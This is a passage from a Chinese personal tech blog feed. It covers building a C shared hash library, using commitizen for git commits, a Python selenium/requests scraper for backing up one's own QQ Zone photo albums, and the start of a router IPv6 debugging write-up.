<h3 id="libhash-so"><a href="#libhash-so" class="headerlink" title="libhash.so"></a>libhash.so</h3><p>在复习哈希函数的同时，顺便复习了下动态链接库的生成和使用，要把<code>hash.c</code>编译成链接库<code>libhash.so</code>，可以使用以下编译语句</p>
<pre><code class="bash">gcc -fPIC -c hash.c
gcc -shared -o libhash.so hash.o
</code></pre>
<p>其中的<code>shared</code>用于指定生成动态链接库。</p>
<p>在使用动态链接库时，需要让使用库文件的程序访问该库，有以下方法：</p>
<ol>
<li>将动态链接库拷贝到系统环境变量包含的路径中，如<code>/usr/lib</code></li>
<li>将动态链接库所在路径添加到环境变量</li>
<li>修改变量<code>LD_LIBRARY_PATH</code>,将动态链接库的路径添加其中</li>
</ol>
<p>下面举一个很简单的例子,<code>demo.c</code></p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;

extern void __nprintf(const char *fmt, ...);
extern uint32_t hash(char *key);
extern char* get(char *key);
extern int set(char *key, char *val);
extern int unset(char *key);
extern int commit();
extern int load();
extern void show();

int main(int argc, char *argv[]) {
    __nprintf(&quot;start&quot;);
    load();
    show();
    __nprintf(&quot;end&quot;);
    return 0;
}
</code></pre>
<p>代码很简单，就是完成哈希表的导入与显示，编译语句如下：</p>
<pre><code class="bash">gcc -fPIC demo.c -o demo -L. -lhash
</code></pre>
<p>其中，<code>-L.</code>代表从当前目录寻找链接库，<code>-lhash</code>代表链接到库<code>libhash.so</code>,注意前缀<code>lib</code>及后缀<code>.so</code>是自动添加的，编译语句中无需添加。</p>
<h3 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h3><p>如果将以上所有程序一起编译，就需要编写<code>Makefile</code>如下</p>
<pre><code class="Makefile">.PHONY: all clean

all: hash test libhash.so demo

CC=gcc
CFLAGS=-fPIC

%.o: %.c
    $(CC) $(CFLAGS) -c $&lt;

hash: main.o hash.o
    $(CC) -o $@ $^

test: test.o hash.o
    $(CC) -o $@ $^

libhash.so: hash.o
    $(CC) -shared -o $@ $^

demo: demo.o
    $(CC) $^ -o $@ -L. -lhash

clean:
    rm -rf *.o hash test libhash.so demo
</code></pre>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文主要讲述了哈希表的简单实现方法及其常见操作，然后通过几个简单例子说明了使用方法，最后顺道说了一下动态链接库的生成及使用方法。</p>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> linux </tag>
            
            <tag> hash </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[git commit 工具 - commitizen]]></title>
      <url>https://www.litreily.top/2019/03/12/commitizen/</url>
      <content type="html"><![CDATA[<p>为了规范代码提交，最近学习了一下如何使用<code>commitizen</code>进行commit提交，其实也很简单，这里简单做个介绍。</p>
<h2 id="commitizen-安装"><a href="#commitizen-安装" class="headerlink" title="commitizen 安装"></a>commitizen 安装</h2><pre><code class="bash">npm install -g commitizen
</code></pre>
<a id="more"></a>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>对于并非使用<code>nodejs</code>的项目，要先通过</p>
<pre><code class="sh">npm init --yes
</code></pre>
<p>完成初始化，然后通过</p>
<pre><code class="sh">commitizen init cz-conventional-changelog --save --save-exact
</code></pre>
<p>启用<code>commitizen</code>功能，此后使用<code>git cz</code>替换<code>git commit</code>即可。当然为了方便可以在<code>.bashrc</code>或<code>.zshrc</code>中添加一个别名。</p>
<pre><code class="sh">alias cz=&quot;commitizen init cz-conventional-changelog --save --save-exact&quot;
</code></pre>
<p>然后<code>source ~/.bashrc</code> or <code>source ~/.zshrc</code> 即可。好了，下面是我的笔记库的应用实例。</p>
<pre><code class="bash">➜  Notes git:(master) ✗ npm init --yes
➜  Notes git:(master) ✗ commitizen init cz-conventional-changelog --save --save-exact
➜  Notes git:(master) ✗ git cz
cz-cli@3.0.7, cz-conventional-changelog@2.1.0


Line 1 will be cropped at 100 characters. All other lines will be wrapped after 100 characters.

? Select the type of change that you&#39;re committing:
  chore:    Other changes that don&#39;t modify src or test files
  revert:   Reverts a previous commit
  feat:     A new feature
❯ fix:      A bug fix
  docs:     Documentation only changes
  style:    Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc)
  refactor: A code change that neither fixes a bug nor adds a feature
(Move up and down to reveal more choices)
</code></pre>
<p>目前该工具支持以下几种提交类型：</p>
<table>
<thead>
<tr>
<th style="text-align:center"><code>type</code></th>
<th style="text-align:left"><code>description</code></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">feat</td>
<td style="text-align:left">A new feature</td>
</tr>
<tr>
<td style="text-align:center">fix</td>
<td style="text-align:left">A bug fix</td>
</tr>
<tr>
<td style="text-align:center">docs</td>
<td style="text-align:left">Documentation only changes</td>
</tr>
<tr>
<td style="text-align:center">style</td>
<td style="text-align:left">Changes that do not affect the meaning of the code</td>
</tr>
<tr>
<td style="text-align:center">refactor</td>
<td style="text-align:left">A code change that neither fixes a bug nor adds a feature</td>
</tr>
<tr>
<td style="text-align:center">perf</td>
<td style="text-align:left">A code change that improves performance</td>
</tr>
<tr>
<td style="text-align:center">test</td>
<td style="text-align:left">Adding missing tests or correcting existing tests</td>
</tr>
<tr>
<td style="text-align:center">build</td>
<td style="text-align:left">Changes that affect the build system or external dependencies</td>
</tr>
<tr>
<td style="text-align:center">ci</td>
<td style="text-align:left">Changes to our CI configuration files and scripts</td>
</tr>
<tr>
<td style="text-align:center">chore</td>
<td style="text-align:left">Other changes that don&#39;t modify src or test files</td>
</tr>
<tr>
<td style="text-align:center">revert</td>
<td style="text-align:left">Reverts a previous commit</td>
</tr>
</tbody>
</table>
<p>下面是添加commit的过程</p>
<pre><code class="bash">➜  Notes git:(master) ✗ git cz
cz-cli@3.0.7, cz-conventional-changelog@2.1.0


Line 1 will be cropped at 100 characters. All other lines will be wrapped after 100 characters.

? Select the type of change that you&#39;re committing: docs:     Documentation only changes
? What is the scope of this change (e.g. component or file name)? (press enter to skip)

? Write a short, imperative tense description of the change:
 update docs about git stash
? Provide a longer description of the change: (press enter to skip)

? Are there any breaking changes? No
? Does this change affect any open issues? No
[master d82e0e9] docs: update docs about git stash
 2 files changed, 19 insertions(+)
➜  Notes git:(master)
</code></pre>
<p>提交过程会逐步提示你添加相应的内容，不添加的直接回车跳过即可。大部分情况只要选择<code>type</code>以及描述信息。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://www.ruanyifeng.com/blog/2016/01/commit_message_change_log.html" target="_blank" rel="noopener">Commit message 和 Change log 编写指南</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> git </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python网络爬虫5 - 爬取QQ空间相册]]></title>
      <url>https://www.litreily.top/2019/03/03/qqzone/</url>
      <content type="html"><![CDATA[<p>自毕业后，就再也没有用过QQ，QQ空间里记录的是些并不精彩的青葱岁月，但好歹也是份回忆，近日想着学以致用，用<code>Python</code>把QQ空间相册的所有照片爬取下来，以作备份。</p>
<h2 id="分析QQ空间"><a href="#分析QQ空间" class="headerlink" title="分析QQ空间"></a>分析QQ空间</h2><h3 id="登录QQ空间"><a href="#登录QQ空间" class="headerlink" title="登录QQ空间"></a>登录QQ空间</h3><p>爬取第一步，分析站点，首先需要知道如何登录QQ空间。最初想法是用<code>requests</code>库配置登录请求，模拟登录，但是不久便放弃了这一思路，请看下图↓</p>
<p><img src="/assets/qqzone/login.png" alt="login"></p>
<p>根据登录按钮绑定的监听事件可以追踪到该按钮的点击事件如下：</p>
<p><img src="/assets/qqzone/login_func.png" alt="login function"></p>
<p>账号加密是必然的，但这一堆堆的代码真心不好解析，有耐心的勇士尽情一试！</p>
<p>在排除这种登录方法后，选择<code>selenium</code>模拟用户登录不失为省时省力的方法，而且我们只是需要通过<code>selenium</code>完成登录，获取到<code>Cookies</code>和后面讲述的<code>g_tk</code>参数后，就可以停用了，所以效率并不太低。</p>
<h3 id="分析空间相册"><a href="#分析空间相册" class="headerlink" title="分析空间相册"></a>分析空间相册</h3><p>登录以后，页面会跳转至 <a href="javascript:;" target="_blank" rel="noopener">https://user.qzone.qq.com/{QQ_NUMBER}</a>, 这时把鼠标移到导航栏你会发现，所有的导航栏链接都是<code>javascript:;</code> 😳。没错就是这么坑，一切都是暗箱操作。</p>
<p>当然这并不难处理，使用调试工具捕获点击后产生的请求，然后过滤出正确的请求包即可。因为网络包非常多，那么怎么过滤呢，猜想相册数据的API必然会返回个列表<code>list</code>，尝试过滤<code>list</code>然后逐个排除，最后定位到请求包。下面是通过<code>fcg_list</code>过滤后的数据包，列表信息以<code>jsonp</code>格式返回，稍作处理即可当做<code>json</code>格式来读取（后面有讲）。</p>
<p><img src="/assets/qqzone/album_list.png" alt="album list"></p>
<p>从<code>Headers</code>和<code>Response</code>可以分别获取到两组<strong>重要</strong>信息：</p>
<ol>
<li><code>request</code> 获取相册列表所需的请求信息，包括请求链接和参数</li>
<li><code>response</code> 数据包包含的所有相册的信息，是每个相册所含照片对应的请求包参数的数据来源</li>
</ol>
<p>先看请求包：</p>
<pre><code class="yml"># url
https://h5.qzone.qq.com/proxy/domain/photo.qzone.qq.com/fcgi-bin/fcg_list_album_v3

# args
g_tk: 477819917
callback: shine0_Callback
t: 691481346
hostUin: 123456789
uin: 123456789
appid: 4
inCharset: utf-8
outCharset: utf-8
source: qzone
plat: qzone
format: jsonp
notice: 0
filter: 1
handset: 4
pageNumModeSort: 40
pageNumModeClass: 15
needUserInfo: 1
idcNum: 4
callbackFun: shine0
_: 1551788226819
</code></pre>
<p>其中<code>hostUin</code>, <code>uin</code>都是QQ号，<code>g_tk</code>是必须的且每次重新登录都会更新（后面有讲如何获取），其它有些参数不是必须的，我尝试后整理出如下请求参数：</p>
<pre><code class="python">query = {
    &#39;g_tk&#39;: self.g_tk,
    &#39;hostUin&#39;: self.username,
    &#39;uin&#39;: self.username,
    &#39;appid&#39;: 4,
    &#39;inCharset&#39;: &#39;utf-8&#39;,
    &#39;outCharset&#39;: &#39;utf-8&#39;,
    &#39;source&#39;: &#39;qzone&#39;,
    &#39;plat&#39;: &#39;qzone&#39;,
    &#39;format&#39;: &#39;jsonp&#39;
}
</code></pre>
<p>接下来看<code>jsonp</code>格式的跨域响应包：</p>
<pre><code class="json">shine0_Callback({
    &quot;code&quot;:0,
    &quot;subcode&quot;:0,
    &quot;message&quot;:&quot;&quot;,
    &quot;default&quot;:0,
    &quot;data&quot;:
{
   &quot;albumListModeSort&quot; : [
      {
         &quot;allowAccess&quot; : 1,
         &quot;anonymity&quot; : 0,
         &quot;bitmap&quot; : &quot;10000000&quot;,
         &quot;classid&quot; : 106,
         &quot;comment&quot; : 11,
         &quot;createtime&quot; : 1402661881,
         &quot;desc&quot; : &quot;&quot;,
         &quot;handset&quot; : 0,
         &quot;id&quot; : &quot;V13LmPKk0JLNRY&quot;,
         &quot;lastuploadtime&quot; : 1402662103,
         &quot;modifytime&quot; : 1408271987,
         &quot;name&quot; : &quot;毕业季&quot;,
         &quot;order&quot; : 0,
         &quot;pre&quot; : &quot;http:\/\/b171.photo.store.qq.com\/psb?\/V13LmPKk0JLNRY\/eSAslg*mYWaytEtLysg*Q*5Km91gIWfGuwSk58K2rQY!\/a\/dIY29GUbJgAA&quot;,
         &quot;priv&quot; : 1,
         &quot;pypriv&quot; : 1,
         &quot;total&quot; : 4,
         &quot;viewtype&quot; : 0
      },
</code></pre>
<p>shine0_Callback是请求包的<code>callbackFun</code>参数决定的，如果没这个参数，响应包会以<code>_Callback</code>作为默认名，当然这都不重要。所有相册信息以<code>json</code>格式存入<code>albumListModeSort</code>中，上面仅截取了一个相册的信息。</p>
<p>相册信息中，<code>name</code>代表相册名称，<code>id</code>作为唯一标识可用于请求该相册内的照片信息，而<code>pre</code>仅仅是一个预览缩略图的链接，无关紧要。</p>
<h3 id="分析单个相册"><a href="#分析单个相册" class="headerlink" title="分析单个相册"></a>分析单个相册</h3><p>与获取相册信息类似，进入某一相册，使用<code>cgi_list</code>过滤数据包，找到该相册的照片信息</p>
<p><img src="/assets/qqzone/photo_list.png" alt="photo list"></p>
<p>同样的道理，根据数据包可以获取照片列表信息的请求包和响应信息，先看请求：</p>
<pre><code class="yml"># url
https://h5.qzone.qq.com/proxy/domain/photo.qzone.qq.com/fcgi-bin/cgi_list_photo

# args
g_tk: 477819917
callback: shine0_Callback
t: 952444063
mode: 0
idcNum: 4
hostUin: 123456789
topicId: V13LmPKk0JLNRY
noTopic: 0
uin: 123456789
pageStart: 0
pageNum: 30
skipCmtCount: 0
singleurl: 1
batchId:
notice: 0
appid: 4
inCharset: utf-8
outCharset: utf-8
source: qzone
plat: qzone
outstyle: json
format: jsonp
json_esc: 1
question:
answer:
callbackFun: shine0
_: 1551790719497
</code></pre>
<p>其中有几个关键参数：</p>
<ol>
<li><code>g_tk</code> - 与相册列表参数一致</li>
<li><code>topicId</code> - 与相册列表参数中的<code>id</code>一致</li>
<li><code>pageStart</code> - 本次请求照片的起始编号</li>
<li><code>pageNum</code> - 本次请求的照片数量</li>
</ol>
<blockquote>
<p>为了一次性获取所有照片，可以将<code>pageStart</code>设为0，<code>pageNum</code>设为所有相册所含照片的最大值。</p>
</blockquote>
<p>同样可以对上面的参数进行简化，在相册列表请求参数的基础上添加<code>topicId</code>，<code>pageStart</code>和<code>pageNum</code>三个参数即可。</p>
<p>下面来看返回的照片列表信息：</p>
<pre><code class="json">shine0_Callback({
    &quot;code&quot;:0,
    &quot;subcode&quot;:0,
    &quot;message&quot;:&quot;&quot;,
    &quot;default&quot;:0,
    &quot;data&quot;:
{
   &quot;limit&quot; : 0,
   &quot;photoList&quot; : [
      {
         &quot;batchId&quot; : &quot;1402662093402000&quot;,
         &quot;browser&quot; : 0,
         &quot;cameratype&quot; : &quot; &quot;,
         &quot;cp_flag&quot; : false,
         &quot;cp_x&quot; : 455,
         &quot;cp_y&quot; : 388,
         &quot;desc&quot; : &quot;&quot;,
         &quot;exif&quot; : {
            &quot;exposureCompensation&quot; : &quot;&quot;,
            &quot;exposureMode&quot; : &quot;&quot;,
            &quot;exposureProgram&quot; : &quot;&quot;,
            &quot;exposureTime&quot; : &quot;&quot;,
            &quot;flash&quot; : &quot;&quot;,
            &quot;fnumber&quot; : &quot;&quot;,
            &quot;focalLength&quot; : &quot;&quot;,
            &quot;iso&quot; : &quot;&quot;,
            &quot;lensModel&quot; : &quot;&quot;,
            &quot;make&quot; : &quot;&quot;,
            &quot;meteringMode&quot; : &quot;&quot;,
            &quot;model&quot; : &quot;&quot;,
            &quot;originalTime&quot; : &quot;&quot;
         },
         &quot;forum&quot; : 0,
         &quot;frameno&quot; : 0,
         &quot;height&quot; : 621,
         &quot;id&quot; : 0,
         &quot;is_video&quot; : false,
         &quot;is_weixin_mode&quot; : 0,
         &quot;ismultiup&quot; : 0,
         &quot;lloc&quot; : &quot;NDN0sggyKs3smlOg6eYghjb0ZRsmAAA!&quot;,
         &quot;modifytime&quot; : 1402661792,
         &quot;name&quot; : &quot;QQ图片20140612104616&quot;,
         &quot;origin&quot; : 0,
         &quot;origin_upload&quot; : 0,
         &quot;origin_url&quot; : &quot;&quot;,
         &quot;owner&quot; : &quot;123456789&quot;,
         &quot;ownername&quot; : &quot;123456789&quot;,
         &quot;photocubage&quot; : 91602,
         &quot;phototype&quot; : 1,
         &quot;picmark_flag&quot; : 0,
         &quot;picrefer&quot; : 1,
         &quot;platformId&quot; : 0,
         &quot;platformSubId&quot; : 0,
         &quot;poiName&quot; : &quot;&quot;,
         &quot;pre&quot; : &quot;http:\/\/b171.photo.store.qq.com\/psb?\/V13LmPKk0JLNRY\/eSAslg*mYWaytEtLysg*Q*5Km91gIWfSk58K2rQY!\/a\/dIY29GUbJgAA&amp;bo=pANtAgAAAAABCeY!&quot;,
         &quot;raw&quot; : &quot;http:\/\/r.photo.store.qq.com\/psb?\/V13LmPKk0JLNRY\/eSAslg*mYWaytEtLysg*Q*5Km91gIWfSk58K2rQY!\/r\/dIY29GUbJgAA&quot;,
         &quot;raw_upload&quot; : 1,
         &quot;rawshoottime&quot; : 0,
         &quot;shoottime&quot; : 0,
         &quot;shorturl&quot; : &quot;&quot;,
         &quot;sloc&quot; : &quot;NDN0sggyKs3smlOg6eYghjb0ZRsmAAA!&quot;,
         &quot;tag&quot; : &quot;&quot;,
         &quot;uploadtime&quot; : &quot;2014-06-13 20:21:33&quot;,
         &quot;url&quot; : &quot;http:\/\/b171.photo.store.qq.com\/psb?\/V13LmPKk0JLNRY\/eSAslg*mYWaytEtLysg*Q*5Km91gIWfSk58K2rQY!\/b\/dIY29GUbJgAA&amp;bo=pANtAgAAAAABCeY!&quot;,
         &quot;width&quot; : 932,
         &quot;yurl&quot; : 0
      },
      // ...
   ]
   &quot;t&quot; : &quot;952444063&quot;,
   &quot;topic&quot; : {
      &quot;bitmap&quot; : &quot;10000000&quot;,
      &quot;browser&quot; : 0,
      &quot;classid&quot; : 106,
      &quot;comment&quot; : 1,
      &quot;cover_id&quot; : &quot;NDN0sggyKs3smlOg6eYghjb0ZRsmAAA!&quot;,
      &quot;createtime&quot; : 1402661881,
      &quot;desc&quot; : &quot;&quot;,
      &quot;handset&quot; : 0,
      &quot;id&quot; : &quot;V13LmPKk0JLNRY&quot;,
      &quot;is_share_album&quot; : 0,
      &quot;lastuploadtime&quot; : 1402662103,
      &quot;modifytime&quot; : 1408271987,
      &quot;name&quot; : &quot;毕业季&quot;,
      &quot;ownerName&quot; : &quot;707922098&quot;,
      &quot;ownerUin&quot; : &quot;707922098&quot;,
      &quot;pre&quot; : &quot;http:\/\/b171.photo.store.qq.com\/psb?\/V13LmPKk0JLNRY\/eSAslg*mYWaytEtLysg*Q*5Km91gIWfGuwSk58K2rQY!\/a\/dIY29GUbJgAA&quot;,
      &quot;priv&quot; : 1,
      &quot;pypriv&quot; : 1,
      &quot;share_album_owner&quot; : 0,
      &quot;total&quot; : 4,
      &quot;url&quot; : &quot;http:\/\/b171.photo.store.qq.com\/psb?\/V13LmPKk0JLNRY\/eSAslg*mYWaytEtLysg*Q*5Km91gIWfGuwSk58K2rQY!\/b\/dIY29GUbJgAA&quot;,
      &quot;viewtype&quot; : 0
   },
   &quot;totalInAlbum&quot; : 4,
   &quot;totalInPage&quot; : 4
}
</code></pre>
<p>返回的照片信息都存于<code>photoList</code>, 上面同样只截取了一张照片的信息，后面一部分返回的是当前相册的一些基本信息。<code>totalInAlbum</code>， <code>totalInPage</code>存储了当前相册总共包含的照片数及本次返回的照片数。而我们需要下载的图片链接则是<code>url</code>！</p>
<p>OK, 到此，所有请求和响应数据都分析清楚了，接下来便是<code>coding</code>的时候了。</p>
<h2 id="确定爬取方案"><a href="#确定爬取方案" class="headerlink" title="确定爬取方案"></a>确定爬取方案</h2><ol>
<li>创建<code>qqzone</code>类，初始化用户信息</li>
<li>使用<code>Selenium</code>模拟登录</li>
<li>获取<code>Cookies</code>和<code>g_tk</code></li>
<li>使用<code>requests</code>获取相册列表信息</li>
<li>遍历相册，获取照片列表信息并下载照片</li>
</ol>
<h3 id="创建qqzone类"><a href="#创建qqzone类" class="headerlink" title="创建qqzone类"></a>创建qqzone类</h3><pre><code class="python">class qqzone(object):
    &quot;&quot;&quot;QQ空间相册爬虫&quot;&quot;&quot;
    def __init__(self, user):
        self.username = user[&#39;username&#39;]
        self.password = user[&#39;password&#39;]
</code></pre>
<h3 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h3><pre><code class="python">from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import WebDriverExceptio

# ...

def _login_and_get_args(self):
    &quot;&quot;&quot;登录QQ，获取Cookies和g_tk&quot;&quot;&quot;
    opt = webdriver.ChromeOptions()
    opt.set_headless()

    driver = webdriver.Chrome(chrome_options=opt)
    driver.get(&#39;https://i.qq.com/&#39;)
    # time.sleep(2)

    logging.info(&#39;User {} login...&#39;.format(self.username))
    driver.switch_to.frame(&#39;login_frame&#39;)
    driver.find_element_by_id(&#39;switcher_plogin&#39;).click()
    driver.find_element_by_id(&#39;u&#39;).clear()
    driver.find_element_by_id(&#39;u&#39;).send_keys(self.username)
    driver.find_element_by_id(&#39;p&#39;).clear()
    driver.find_element_by_id(&#39;p&#39;).send_keys(self.password)
    driver.find_element_by_id(&#39;login_button&#39;).click()

    time.sleep(1)
    driver.get(&#39;https://user.qzone.qq.com/{}&#39;.format(self.username))
</code></pre>
<p>此处需要注意的是：</p>
<ol>
<li>使用<code>selenium</code>需要安装对应的<code>webdriver</code></li>
<li>可以通过<code>webdriver.Chrome()</code>指定浏览器位置，否则默认从环境变量定义的路径查找</li>
<li>如果电脑打开浏览器较慢，可能需要在<code>driver.get</code>后<code>sleep</code>几秒</li>
</ol>
<h3 id="获取-Cookies"><a href="#获取-Cookies" class="headerlink" title="获取 Cookies"></a>获取 Cookies</h3><p>使用<code>selenium</code>获取<code>Cookies</code>非常方便</p>
<pre><code class="python">self.cookies = driver.get_cookies()
</code></pre>
<h3 id="获取-g-tk"><a href="#获取-g-tk" class="headerlink" title="获取 g_tk"></a>获取 g_tk</h3><p>获取<code>g_tk</code>最开始可以说是本爬虫最大的难点，因为从网页中根本找不到直接写明的数值，只有各种函数调用。为此我全局搜索，发现好多地方都有其获取方式。</p>
<p><img src="/assets/qqzone/g_tk.png" alt="g_tk"></p>
<p>最后选择了其中一处，通过<code>selenium</code>执行脚本的功能成功获取到了<code>g_tk</code>！</p>
<pre><code class="python">self.g_tk = driver.execute_script(&#39;return QZONE.FP.getACSRFToken()&#39;)
</code></pre>
<p>到此，<code>selenium</code>的使命就完成了，剩下的将通过<code>requests</code>来完成。</p>
<h3 id="初始化-request-Session"><a href="#初始化-request-Session" class="headerlink" title="初始化 request.Session"></a>初始化 request.Session</h3><p>接下来需要逐步生成请求然后获取数据。但是为方便起见，这里使用会话的方式请求数据，配置好<code>cookie</code>和<code>headers</code>，省的每次请求都设置一遍。</p>
<pre><code class="python">def _init_session(self):
    self.session = requests.Session()
    for cookie in self.cookies:
        self.session.cookies.set(cookie[&#39;name&#39;], cookie[&#39;value&#39;])
    self.session.headers = {
        &#39;Referer&#39;: &#39;https://qzs.qq.com/qzone/photo/v7/page/photo.html?init=photo.v7/module/albumList/index&amp;navBar=1&#39;,
        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36&#39;
    }
</code></pre>
<h3 id="请求相册信息"><a href="#请求相册信息" class="headerlink" title="请求相册信息"></a>请求相册信息</h3><p>获取相册信息，需要先封装好请求参数，然后通过<code>session.get</code>爬取数据，再通过正则匹配以<code>json</code>格式读取<code>jsonp</code>数据，最后解析所需的<code>name</code>和<code>id</code>。</p>
<pre><code class="python">def _get_ablum_list(self):
    &quot;&quot;&quot;获取相册的列表信息&quot;&quot;&quot;
    album_url = &#39;{}{}&#39;.format(
        &#39;https://h5.qzone.qq.com/proxy/domain/photo.qzone.qq.com/fcgi-bin/fcg_list_album_v3?&#39;,
        self._get_query_for_request())

    logging.info(&#39;Getting ablum list id...&#39;)
    resp = self.session.get(album_url)
    data = self._load_callback_data(resp)

    album_list = {}
    for item in data[&#39;data&#39;][&#39;albumListModeSort&#39;]:
        album_list[item[&#39;name&#39;]] = item[&#39;id&#39;]

    return album_list
</code></pre>
<p>其中的参数组合来自下面的函数<code>_get_query_for_request</code>函数。</p>
<pre><code class="python">def _get_query_for_request(self, topicId=None, pageStart=0, pageNum=100):
    &quot;&quot;&quot;获取请求相册信息或照片信息所需的参数

    Args:
        topicId: 每个相册对应的唯一标识符
        pageStart: 请求某个相册的照片列表信息所需的起始页码
        pageNum: 单次请求某个相册的照片数量

    Returns:
        一个组合好所有请求参数的字符串
    &quot;&quot;&quot;
    query = {
        &#39;g_tk&#39;: self.g_tk,
        &#39;hostUin&#39;: self.username,
        &#39;uin&#39;: self.username,
        &#39;appid&#39;: 4,
        &#39;inCharset&#39;: &#39;utf-8&#39;,
        &#39;outCharset&#39;: &#39;utf-8&#39;,
        &#39;source&#39;: &#39;qzone&#39;,
        &#39;plat&#39;: &#39;qzone&#39;,
        &#39;format&#39;: &#39;jsonp&#39;
    }
    if topicId:
        query[&#39;topicId&#39;] = topicId
        query[&#39;pageStart&#39;] = pageStart
        query[&#39;pageNum&#39;] = pageNum
    return &#39;&amp;&#39;.join(&#39;{}={}&#39;.format(key, val) for key, val in query.items())
</code></pre>
<p>其中的<code>jsonp</code>解析函数如下，主体部分就是一个正则匹配，非常简单。</p>
<pre><code class="Python">def _load_callback_data(self, resp):
    &quot;&quot;&quot;以json格式解析返回的jsonp数据&quot;&quot;&quot;
    try:
        resp.encoding = &#39;utf-8&#39;
        data = loads(re.search(r&#39;.*?\(({.*}).*?\).*&#39;, resp.text, re.S)[1])
        return data
    except ValueError:
        logging.error(&#39;Invalid input&#39;)
</code></pre>
<h3 id="解析并下载照片"><a href="#解析并下载照片" class="headerlink" title="解析并下载照片"></a>解析并下载照片</h3><p>获取相册列表后，逐个请求照片列表信息，进而逐一下载</p>
<pre><code class="python">def _get_photo(self, album_name, album_id):
    &quot;&quot;&quot;获取单个相册的照片列表信息，并下载该相册所有照片&quot;&quot;&quot;
    photo_list_url = &#39;{}{}&#39;.format(
        &#39;https://h5.qzone.qq.com/proxy/domain/photo.qzone.qq.com/fcgi-bin/cgi_list_photo?&#39;,
        self._get_query_for_request(topicId=album_id))

    logging.info(&#39;Getting photo list for album {}...&#39;.format(album_name))
    resp = self.session.get(photo_list_url)
    data = self._load_callback_data(resp)
    if data[&#39;data&#39;][&#39;totalInPage&#39;] == 0:
        return None

    file_dir = self.get_path(album_name)
    for item in data[&#39;data&#39;][&#39;photoList&#39;]:
        path = &#39;{}/{}.jpg&#39;.format(file_dir, item[&#39;name&#39;])
        logging.info(&#39;Downloading {}-{}&#39;.format(album_name, item[&#39;name&#39;]))
        self._download_image(item[&#39;url&#39;], path)
</code></pre>
<p>下载图片也是通过<code>request</code>,记得设置超时时间。</p>
<pre><code class="python">def _download_image(self, url, path):
    &quot;&quot;&quot;下载单张照片&quot;&quot;&quot;
    try:
        resp = self.session.get(url, timeout=15)
        if resp.status_code == 200:
            open(path, &#39;wb&#39;).write(resp.content)
    except requests.exceptions.Timeout:
        logging.warning(&#39;get {} timeout&#39;.format(url))
    except requests.exceptions.ConnectionError as e:
        logging.error(e.__str__)
    finally:
        pass
</code></pre>
<h2 id="爬取测试"><a href="#爬取测试" class="headerlink" title="爬取测试"></a>爬取测试</h2><ul>
<li>爬取过程</li>
</ul>
<p><img src="/assets/qqzone/downloading.png" alt="capturing"></p>
<ul>
<li>爬取结果</li>
</ul>
<p><img src="/assets/qqzone/downloaded_photos.png" alt="downloaded photos"></p>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><ol>
<li>如果将请求参数中的<code>format</code>由<code>jsonp</code>改成<code>json</code>，则可以直接获取<code>json</code>数据</li>
<li>本用例并未使用多进程或多线程，所以速率不算快，还有待优化的地方</li>
<li>该爬虫已存放至开源项目<a href="https://github.com/Litreily/capturer" target="_blank" rel="noopener">Github capturer</a>，欢迎交流</li>
</ol>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spider </tag>
            
            <tag> qqzone </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[记一次Client无法获取IPv6地址问题的分析过程]]></title>
      <url>https://www.litreily.top/2019/02/27/ipv6/</url>
      <content type="html"><![CDATA[<p>近日SQA报了一个bug，对路由器经过6天左右的压力测试后，无论是有线设备还是无线设备都拿不到<code>IPv6</code>地址了。经过层层分析发现可能是<code>kernel</code>内存泄漏。本文便记录这一问题的分析过程。</p>
<a id="more"></a>
<h2 id="检查网络状态"><a href="#检查网络状态" class="headerlink" title="检查网络状态"></a>检查网络状态</h2><p>首先打开Router的console，使用<code>ifconfig br0</code>(br0是Router LAN端的桥接地址)查看当前的网络状态</p>
<pre><code class="sh">$ ifconfig br0
br0       Link encap:Ethernet  HWaddr A0:63:91:A7:63:07  
          inet addr:192.168.27.1  Bcast:192.168.27.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:530995052 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1012058984 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:108097854210 (100.6 GiB)  TX bytes:1331062907089 (1.2 TiB)
</code></pre>
<p>可以看到，Router自身也只有<code>IPv4</code>地址，没有<code>IPv6</code>地址，所以问题出在Router自身，不可能是Client配置错误，那为什么Router自己都没有拿到<code>IPv6</code>呢？下面来分析压力测试过程保存的console log.</p>
<h2 id="分析console-log"><a href="#分析console-log" class="headerlink" title="分析console log"></a>分析console log</h2><p>在压力测试的前几天，从以下log可知Router是有<code>IPv6</code>的，Router貌似正常运行几天后就失去了<code>Ipv6</code></p>
<pre><code class="sh">br0       Link encap:Ethernet  HWaddr A0:63:91:A7:63:07  
          inet addr:192.168.27.1  Bcast:192.168.27.255  Mask:255.255.255.0
          inet6 addr: 2002:76a7:859d:0:44f3:adff:fef9:f52/64 Scope:Global
          inet6 addr: fe80::a263:91ff:fea7:6307/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1184678 errors:0 dropped:0 overruns:0 frame:0
